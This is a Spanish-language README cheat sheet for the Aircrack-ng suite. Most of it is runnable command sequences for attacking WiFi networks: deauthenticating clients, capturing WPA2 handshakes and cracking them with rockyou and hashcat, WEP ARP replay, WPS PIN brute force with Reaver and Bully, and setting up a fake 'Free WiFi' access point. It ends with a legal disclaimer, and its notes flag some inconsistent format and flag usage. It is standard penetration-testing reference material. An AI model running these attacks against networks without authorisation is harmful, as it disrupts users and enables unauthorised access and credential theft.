# 📶 Aircrack-ng: guía de consulta de la suite de auditoría WiFi

<!-- language-home-navigation -->
[🏠 Página principal en español](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
   █████╗ ██╗██████╗  ██████╗██████╗  █████╗  ██████╗██╗  ██╗
  ██╔══██╗██║██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝
  ███████║██║██████╔╝██║     ██████╔╝███████║██║     █████╔╝ 
  ██╔══██║██║██╔══██╗██║     ██╔══██╗██╔══██║██║     ██╔═██╗ 
  ██║  ██║██║██║  ██║╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗
  ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
                    Suite de auditoría WiFi
```

<p align="center">
  <img src="https://img.shields.io/badge/Aircrack--ng-WiFi_Hacking-blue?style=for-the-badge" alt="Aircrack-ng">
  <img src="https://img.shields.io/badge/WPA2-Cracking-red?style=for-the-badge" alt="WPA2">
  <img src="https://img.shields.io/badge/Wireless-Security-green?style=for-the-badge" alt="Redes inalámbricas">
</p>

---

## 📋 Índice

- [Qué es Aircrack-ng](#-qué-es-aircrack-ng)
- [Instalación](#-instalación)
- [Modo monitor](#-modo-monitor)
- [Reconocimiento (airodump-ng)](#-reconocimiento-airodump-ng)
- [Desautenticación (aireplay-ng)](#-desautenticación-aireplay-ng)
- [Recuperación de claves WPA/WPA2](#-recuperación-de-claves-wpawpa2)
- [Recuperación de claves WEP](#-recuperación-de-claves-wep)
- [Ataques contra WPS](#-ataques-contra-wps)
- [Herramientas adicionales](#-herramientas-adicionales)
- [Flujo de trabajo completo del ataque](#-flujo-de-trabajo-completo-del-ataque)
- [Referencia rápida](#-referencia-rápida)

---

## 🎯 Qué es Aircrack-ng

> **Corrección del nombre original:** La lista inicial menciona `airodecap-ng`, pero el ejecutable correcto es `airdecap-ng`, tal como aparece en los ejemplos posteriores. Véase la [documentación oficial de airdecap-ng](https://www.aircrack-ng.org/doku.php?id=airdecap-ng).

**Aircrack-ng** es una suite completa para evaluar la seguridad de redes WiFi. Incluye:

- 📡 **airodump-ng** - Captura de paquetes y detección de redes
- 💥 **aireplay-ng** - Inyección de paquetes y ataques de desautenticación
- 🔓 **aircrack-ng** - Recuperación de claves WEP y WPA/WPA2
- 🔧 **airmon-ng** - Activación y desactivación del modo monitor
- 📝 **airodecap-ng** - Descifrado del tráfico capturado

### Requisitos

| Requisito | Descripción |
|-------------|-------------|
| **Adaptador inalámbrico** | Debe admitir el modo monitor y la inyección de paquetes |
| **Chipsets compatibles** | Atheros, Ralink y algunos Realtek |
| **Sistema operativo** | Se recomienda Linux (Kali) |

### Adaptadores compatibles habituales

> **Compatibilidad:** La revisión física del adaptador, el controlador, el kernel y la banda determinan las funciones disponibles. La compatibilidad del chipset no garantiza por sí sola la inyección con cualquier revisión; en particular, el ejemplo de TP-Link se refiere a la revisión v1.

| Adaptador | Chipset | Notas |
|---------|---------|-------|
| Alfa AWUS036ACH | RTL8812AU | Doble banda y buena potencia |
| Alfa AWUS036NHA | Atheros AR9271 | Clásico y fiable |
| TP-Link TL-WN722N v1 | Atheros AR9271 | Opción económica |

---

## 🚀 Instalación

### Kali Linux (preinstalado)

> **Compatibilidad:** La presencia del paquete y de los diccionarios depende de la imagen de Kali instalada; rockyou puede distribuirse comprimido. La opción `--version` del ejemplo puede no estar admitida; la cabecera de ayuda muestra la versión. Consulta la [implementación oficial de Aircrack-ng](https://github.com/aircrack-ng/aircrack-ng/blob/master/src/aircrack-ng/aircrack-ng.c).

```bash
# Ya está instalado; comprobar la versión
aircrack-ng --version

# Actualizar
sudo apt update && sudo apt install aircrack-ng
```

### Debian/Ubuntu

```bash
sudo apt update
sudo apt install aircrack-ng
```

### Compilación desde el código fuente

```bash
git clone https://github.com/aircrack-ng/aircrack-ng.git
cd aircrack-ng
autoreconf -i
./configure
make
sudo make install
```

---

## 📡 Modo monitor

### Comprobar la interfaz inalámbrica

```bash
# Enumerar las interfaces inalámbricas
iwconfig

# O bien
iw dev

# O bien
airmon-ng
```

### Activar el modo monitor

> **Aclaración:** `wlan0` y `wlan0mon` son nombres de ejemplo. El nombre de la interfaz y la salida exacta dependen del controlador; el modo monitor no implica que la inyección esté disponible.

```bash
# Método 1: airmon-ng (recomendado)
sudo airmon-ng start wlan0

# Salida: Monitor mode enabled on wlan0mon

# Método 2: manual
sudo ifconfig wlan0 down
sudo iwconfig wlan0 mode monitor
sudo ifconfig wlan0 up
```

### Detener los procesos que interfieren

```bash
# Detener los procesos que puedan interferir
sudo airmon-ng check kill

# O hacerlo manualmente
sudo systemctl stop NetworkManager
sudo killall wpa_supplicant
```

### Desactivar el modo monitor

```bash
# Desactivar el modo monitor
sudo airmon-ng stop wlan0mon

# Reiniciar NetworkManager
sudo systemctl start NetworkManager
```

### Cambiar de canal

```bash
# Establecer un canal concreto
sudo iwconfig wlan0mon channel 6

# O mediante airmon-ng
sudo airmon-ng start wlan0 6
```

---

## 🔍 Reconocimiento (airodump-ng)

### Exploración básica

```bash
# Buscar todas las redes
sudo airodump-ng wlan0mon

# Salida:
# BSSID              PWR  CH  ENC   AUTH  ESSID
# AA:BB:CC:DD:EE:FF  -45   6  WPA2  PSK   TargetNetwork
```

### Explorar una banda concreta

```bash
# Solo 2,4 GHz
sudo airodump-ng --band g wlan0mon

# Solo 5 GHz
sudo airodump-ng --band a wlan0mon

# Ambas bandas
sudo airodump-ng --band abg wlan0mon
```

### Seleccionar una red concreta

```bash
# Filtrar por canal y BSSID
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon

# Guardar la captura en un archivo
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Genera: capture-01.cap, capture-01.csv, etc.
```

### Interpretar la salida

```
BSSID              PWR  Beacons  #Data  CH  MB  ENC   CIPHER  AUTH  ESSID
AA:BB:CC:DD:EE:FF  -45  150      45     6   54  WPA2  CCMP    PSK   HomeNetwork

BSSID              STATION            PWR   Rate  Lost  Frames  Notes
AA:BB:CC:DD:EE:FF  11:22:33:44:55:66  -50   54e-54e  0    125    
```

| Campo | Descripción |
|-------|-------------|
| BSSID | Dirección MAC del punto de acceso (AP) |
| PWR | Intensidad de la señal (cuanto más cerca de 0, mayor intensidad) |
| Beacons | Número de tramas de baliza (beacon) |
| #Data | Número de paquetes de datos |
| CH | Canal |
| ENC | Cifrado (WPA2/WPA/WEP/OPN) |
| CIPHER | CCMP (AES) / TKIP |
| AUTH | PSK / MGT |
| ESSID | Nombre de la red |
| STATION | MAC del cliente conectado |

### Opciones de filtrado

```bash
# Mostrar solo redes cifradas
sudo airodump-ng --encrypt wpa2 wlan0mon

# Mostrar solo WEP
sudo airodump-ng --encrypt wep wlan0mon

# ESSID concreto
sudo airodump-ng --essid "TargetNetwork" wlan0mon
```

---

## 💥 Desautenticación (aireplay-ng)

### ¿Para qué sirve la desautenticación?

> **Alcance:** La recuperación por diccionario mostrada corresponde a WPA/WPA2-Personal con PSK; no se aplica de la misma forma a WPA-Enterprise ni a WPA3-SAE. La desautenticación no garantiza una reconexión ni la captura de un intercambio válido, y las tramas de gestión protegidas (PMF) pueden impedir estos ataques.

La desautenticación fuerza la reconexión de los clientes y permite capturar el intercambio de cuatro mensajes (*4-way handshake*) necesario para probar contraseñas WPA/WPA2.

### Desautenticar a un cliente

```bash
# Desautenticar a un cliente concreto
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# -0 : Ataque de desautenticación
# 5  : Número de desautenticaciones (0 = continuo)
# -a : BSSID del punto de acceso
# -c : MAC del cliente
```

### Desautenticar a todos los clientes

```bash
# Desautenticación por difusión (todos los clientes)
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# Más agresivo
sudo aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon
```

### Comprobar si se ha capturado el handshake

```
# En airodump-ng, buscar:
WPA handshake: AA:BB:CC:DD:EE:FF

# Aparece en la esquina superior derecha
```

---

## 🔓 Recuperación de claves WPA/WPA2

### Flujo de trabajo completo de un ataque WPA2

```bash
# Paso 1: activar el modo monitor
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Paso 2: buscar redes
sudo airodump-ng wlan0mon

# Paso 3: seleccionar una red concreta (captura)
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Paso 4: desautenticar al cliente (en otro terminal)
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Paso 5: esperar al handshake (se muestra en airodump-ng)
# "WPA handshake: AA:BB:CC:DD:EE:FF"

# Paso 6: probar contraseñas con un diccionario
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
```

### Ataque de diccionario

```bash
# Ataque básico de diccionario
aircrack-ng -w wordlist.txt capture-01.cap

# Utilizar rockyou
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# Varios diccionarios
aircrack-ng -w wordlist1.txt,wordlist2.txt capture-01.cap
```

### Especificar el ESSID objetivo

```bash
# Si la captura contiene varias redes
aircrack-ng -w wordlist.txt -e "TargetNetwork" capture-01.cap

# O por BSSID
aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture-01.cap
```

### Utilizar Hashcat (mayor velocidad con GPU)

> **Corrección de formatos:** El modo `22000` espera el formato de texto hc22000 (PMKID/EAPOL), no un archivo `.hccapx`. Aircrack-ng usa `-j` para HCCAPX; el bloque con `-J` mezcla opciones y formatos históricos. La misma incompatibilidad se repite en el flujo final. Se conservan las órdenes originales; consulta la [guía oficial de Hashcat](https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2) y el [código oficial de Aircrack-ng](https://github.com/aircrack-ng/aircrack-ng/blob/master/src/aircrack-ng/aircrack-ng.c).

```bash
# Convertir cap al formato de Hashcat
aircrack-ng capture-01.cap -J hashcat_file
# Genera: hashcat_file.hccapx

# O utilizar cap2hccapx
cap2hccapx capture-01.cap hashcat_file.hccapx

# Probar contraseñas con Hashcat
hashcat -m 22000 hashcat_file.hccapx wordlist.txt

# hashcat -m 2500 para el formato hccap antiguo
```

### Convertir formatos

```bash
# CAP a HCCAPX (Hashcat)
aircrack-ng capture-01.cap -j hashcat_output

# CAP a PCAP
editcap capture-01.cap output.pcap

# Combinar varias capturas cap
mergecap -w merged.cap capture-01.cap capture-02.cap
```

---

## 🔐 Recuperación de claves WEP

> ⚠️ WEP está obsoleto y es inseguro. Actualmente, la mayoría de las redes utilizan WPA2/WPA3.

### Tipos de ataque contra WEP

| Ataque | Descripción |
|--------|-------------|
| Reenvío de ARP (ARP Replay) | Capturar y reenviar paquetes ARP |
| Autenticación falsa (Fake Auth) | Asociarse al punto de acceso sin la clave |
| Fragmentación | Generar un flujo de claves (keystream) |
| ChopChop | Descifrar paquetes sin la clave |

### Ataque básico contra WEP

> **Aclaración:** Los IV son vectores de inicialización. El umbral de 50 000 del ejemplo no garantiza recuperar la clave; depende de la calidad y variedad del tráfico capturado y del método utilizado.

```bash
# Paso 1: capturar tráfico
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_capture wlan0mon

# Paso 2: autenticación falsa
sudo aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF -h <your_mac> wlan0mon

# Paso 3: ataque de reenvío de ARP
sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h <your_mac> wlan0mon

# Paso 4: recuperar la clave cuando haya suficientes IV (>50,000)
sudo aircrack-ng wep_capture-01.cap
```

### Modos de ataque de aireplay-ng

| Modo | Descripción |
|------|-------------|
| `-0` | Desautenticación |
| `-1` | Autenticación falsa |
| `-2` | Reenvío interactivo de paquetes |
| `-3` | Reenvío de solicitudes ARP |
| `-4` | Ataque chopchop de KoreK |
| `-5` | Ataque de fragmentación |
| `-9` | Prueba de inyección |

---

## 🔓 Ataques contra WPS

> **Compatibilidad:** WPS debe estar habilitado y el punto de acceso debe ser vulnerable al método elegido. Pixie-Dust depende de implementaciones concretas y de pixiewps; no es simplemente una variante más rápida que funcione en todas las redes. La sintaxis de `-K` depende de la versión de Reaver. Véase el [proyecto oficial del fork de Reaver](https://github.com/t6x/reaver-wps-fork-t6x).

### Utilizar Reaver

```bash
# Instalar Reaver
sudo apt install reaver

# Ataque básico contra WPS
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv

# Especificando el canal
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv

# Ataque Pixie-Dust (más rápido)
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1 -vv
```

### Utilizar Bully

```bash
# Instalar Bully
sudo apt install bully

# Ataque básico
sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -v 3

# Pixie-Dust
sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -d -v 3
```

### Wash (buscar puntos de acceso con WPS activado)

```bash
# Buscar redes con WPS
sudo wash -i wlan0mon

# La salida muestra:
# BSSID              Ch  dBm  WPS  Lck  Vendor  ESSID
# AA:BB:CC:DD:EE:FF   6  -45  2.0  No   Realtek HomeNetwork
```

---

## 🔧 Herramientas adicionales

### airbase-ng (punto de acceso falso)

```bash
# Crear un punto de acceso falso
sudo airbase-ng -e "Free WiFi" -c 6 wlan0mon

# Con un BSSID concreto
sudo airbase-ng -e "Free WiFi" -a AA:BB:CC:DD:EE:FF -c 6 wlan0mon
```

### airdecap-ng (descifrar capturas)

```bash
# Descifrar una captura WPA con una clave conocida
airdecap-ng -e "NetworkName" -p "password123" capture-01.cap

# Descifrar una captura WEP
airdecap-ng -w <wep_key> capture-01.cap
```

### Opciones de aircrack-ng

```bash
# Mostrar todas las opciones
aircrack-ng --help

# Utilizar varios núcleos de CPU
aircrack-ng -p 4 -w wordlist.txt capture-01.cap

# Modo silencioso
aircrack-ng -q -w wordlist.txt capture-01.cap

# Especificar el ESSID
aircrack-ng -e "NetworkName" -w wordlist.txt capture-01.cap
```

### packetforge-ng (crear paquetes)

```bash
# Crear un paquete ARP
packetforge-ng -0 -a AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 -k 255.255.255.255 -l 255.255.255.255 -y fragment.xor -w arp_packet
```

---

## 🎯 Flujo de trabajo completo del ataque

### Ataque WPA2 paso a paso

```bash
# Terminal 1: preparación
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Comprobar el modo monitor
iwconfig  # Debería mostrar wlan0mon

# Terminal 1: buscar redes
sudo airodump-ng wlan0mon
# Anotar el BSSID, CH y ESSID del objetivo

# Terminal 1: seleccionar el objetivo y capturar
sudo airodump-ng -c <CHANNEL> --bssid <TARGET_BSSID> -w handshake wlan0mon

# Terminal 2: ataque de desautenticación
sudo aireplay-ng -0 5 -a <TARGET_BSSID> -c <CLIENT_MAC> wlan0mon

# Esperar a que aparezca "WPA handshake: XX:XX:XX:XX:XX:XX" en el terminal 1
# Pulsar Ctrl+C para detener la captura

# Terminal 1: probar contraseñas contra el handshake
aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake-01.cap

# O con Hashcat (más rápido con GPU)
aircrack-ng handshake-01.cap -j hashcat_file
hashcat -m 22000 hashcat_file.hccapx /usr/share/wordlists/rockyou.txt
```

### Limpieza después del ataque

```bash
# Desactivar el modo monitor
sudo airmon-ng stop wlan0mon

# Reiniciar NetworkManager
sudo systemctl start NetworkManager

# Eliminar los archivos (opcional)
rm -f handshake-*.cap handshake-*.csv handshake-*.kismet.csv
```

---

## 📊 Referencia rápida

### Comandos esenciales

| Finalidad | Comando |
|---------|---------|
| Activar el modo monitor | `airmon-ng start wlan0` |
| Desactivar el modo monitor | `airmon-ng stop wlan0mon` |
| Detener los procesos que interfieren | `airmon-ng check kill` |
| Buscar redes | `airodump-ng wlan0mon` |
| Seleccionar la red objetivo | `airodump-ng -c CH --bssid BSSID -w file wlan0mon` |
| Desautenticar | `aireplay-ng -0 5 -a BSSID -c CLIENT wlan0mon` |
| Recuperar una clave WPA | `aircrack-ng -w wordlist.txt capture.cap` |

### Resumen de ataques

| Ataque | Cifrado | Método |
|--------|------------|--------|
| Diccionario | WPA/WPA2 | Capturar el handshake → Probar contraseñas con un diccionario |
| Reaver | WPS | Fuerza bruta contra el PIN de WPS |
| Pixie-Dust | WPS | Ataque WPS sin conexión |
| Reenvío de ARP (ARP Replay) | WEP | Recopilar IV → Recuperar la clave |

### Diccionarios útiles

| Ruta | Descripción |
|------|-------------|
| `/usr/share/wordlists/rockyou.txt` | El más habitual (Kali) |
| `/usr/share/wordlists/fasttrack.txt` | Comprobación rápida |
| `/usr/share/seclists/Passwords/` | Colección SecLists |

### Solución de problemas

```bash
# La interfaz no entra en modo monitor
sudo rfkill unblock wifi
sudo rfkill unblock all

# Comprobar si el controlador admite la inyección
sudo aireplay-ng -9 wlan0mon

# No se ha capturado ningún handshake
# - Acercarse al objetivo
# - Probar con otros clientes
# - Desautenticar de forma más agresiva
# - Esperar más tiempo

# Airmon muestra "Found X processes"
sudo airmon-ng check kill
```

---

## ⚠️ Aviso legal

```
⚠️ ADVERTENCIA: Utiliza estas herramientas solo en redes PROPIAS o con 
PERMISO EXPLÍCITO POR ESCRITO para realizar pruebas. El acceso no autorizado a 
redes informáticas es ILEGAL en la mayoría de las jurisdicciones.

Utilízalas de forma responsable para:
✅ Auditorías de seguridad
✅ Pruebas de penetración (con permiso)
✅ Fines educativos (en un laboratorio)

Nunca las utilices para:
❌ Acceder a redes sin autorización
❌ Robar credenciales
❌ Ningún fin malicioso
```

---

## 📚 Recursos

- [Sitio oficial de Aircrack-ng](https://www.aircrack-ng.org/)
- [Aircrack-ng Wiki](https://www.aircrack-ng.org/doku.php)
- [Hashcat WiFi](https://hashcat.net/wiki/)

### Guías de consulta relacionadas
- [Hashcat](../../Hashcat/translations/README.es.md)
- [Wireshark](../../Wireshark/translations/README.es.md)
- [Comandos de Linux](../../Linux-Commands/translations/README.es.md)

---

<p align="center">
  <b>📶 ¡Domina las pruebas de seguridad WiFi!</b><br>
  <i>Aircrack-ng: el mejor aliado del pentester WiFi</i>
</p>
